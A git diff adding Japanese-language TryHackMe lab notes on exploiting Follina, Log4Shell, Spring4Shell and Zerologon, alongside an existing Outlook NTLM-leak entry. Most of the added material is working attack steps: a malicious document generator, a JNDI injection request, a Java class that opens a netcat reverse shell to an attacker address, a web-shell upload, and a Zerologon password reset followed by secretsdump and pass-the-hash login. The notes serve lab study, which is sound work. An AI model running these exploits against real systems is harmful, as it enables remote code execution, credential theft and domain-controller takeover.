@@ -504,6 +504,34 @@ Import-Module .\CVE-2023-23397.ps1
 Send-CalendarNTLMLeak -recipient "test@thm.loc" -remotefilepath "\\ATTACKER_IP\foo\bar.wav" -meetingsubject "THM Meeting" -meetingbody "This is just a regular meeting invitation :)"
 ```
 
+## CVE-2022-30190 (Follina MSDT)
+
+https://tryhackme.com/room/follinamsdt
+
+- Microsoft Support Diagnostic Tool
+
+### エクスプロイト
+
+https://github.com/JohnHammond/msdt-follina
+
+```sh
+root@ip-10-10-118-34:~/Rooms/Follina-MSDT# python3.9 follina.py -i ens5
+[+] copied staging doc /tmp/mhhf08bg
+[+] created maldoc ./follina.doc
+[+] serving html payload on :8000
+```
+
+```sh
+root@ip-10-10-118-34:~/Rooms/Follina-MSDT# python3 -m http.server 3456
+Serving HTTP on 0.0.0.0 port 3456 (http://0.0.0.0:3456/) ...
+```
+
+```ps
+C:\Users\Administrator\Desktop>curl http://[attackbox IP]:3456/follina.doc -o follina.docx
+curl: (3) [globbing] bad range in column 9
+curl: (3) [globbing] unmatched close brace/bracket in column 3
+```
+
 ## CVE-2022-26134 (Atlassian)
 
 https://tryhackme.com/room/cve202226134
@@ -526,4 +554,78 @@ PoC を THM のルームから添付ファイルとしてダウンロード可�
 
 ```sh
 python ./poc.py http://10.10.84.202:8090 cat%20/flag.txt
+```
+
+
+## CVE-2021-44228 (Log4Shell)
+
+https://tryhackme.com/room/solar
+
+- `log4j < 2.16.0`
+- JNDI の悪用。NJDIは、2.16.0 で完全に無効化された。
+
+JNDI の[リファラルサーバー](https://github.com/mbechler/marshalsec)を起動。8000ポートに転送する設定。
+
+```sh
+java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://10.10.109.228:8000/#Exploit"
+```
+
+リバースシェルのJavaを8000ポートでホスト。
+
+```java
+public class Exploit {
+    static {
+        try {
+            java.lang.Runtime.getRuntime().exec("nc -e /bin/bash YOUR.ATTACKER.IP.ADDRESS 9999");
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+}
+```
+
+リファラルサーバーにリクエストさせると、最終的に9999ポートに接続が来る流れ。
+
+```sh
+curl 'http://10.10.254.211:8983/solr/admin/cores?foo=$\{jndi:ldap://10.10.109.228:1389/Exploit\}'
+```
+
+## CVE-2022-22965 (Spring4Shell)
+
+https://tryhackme.com/room/spring4shell
+
+- JDK9 以上かつ Spring Core (<5.2 | 5.2.0-19 | 5.3.0-17)
+
+[PoC](https://github.com/BobTheShoplifter/Spring4Shell-POC/)
+
+```sh
+# THMに添付のコードを使用
+$ ./exploit.py http://10.10.41.118/
+
+Shell Uploaded Successfully!
+Your shell can be found at: http://10.10.41.118/tomcatwar.jsp?pwd=thm&cmd=whoami
+```
+
+## CVE-2020-1472 (Zero Logon)
+
+https://tryhackme.com/room/zer0logon
+
+- ドメインコントローラを乗っ取られる脆弱性
+- マシンアカウントのパスワードをリセットする（パスワードなしにする）
+- IVの値を0固定で暗号化していることが原因
+- 2020年8月のパッチで修正
+
+### PoC
+
+https://github.com/SecuraBV/CVE-2020-1472
+
+（パスワードリセット有）  
+https://raw.githubusercontent.com/Sq00ky/Zero-Logon-Exploit/master/zeroLogon-NullPass.py
+
+```sh
+python zerologon-exploit.py DC01 <dc-ip>
+
+sudo secretsdump.py -just-dc -no-pass DC01\$@<dc-ip>
+
+evil-winrm -u Administrator -H <Local Admin Hash> -i MACHINE_IP
 ```
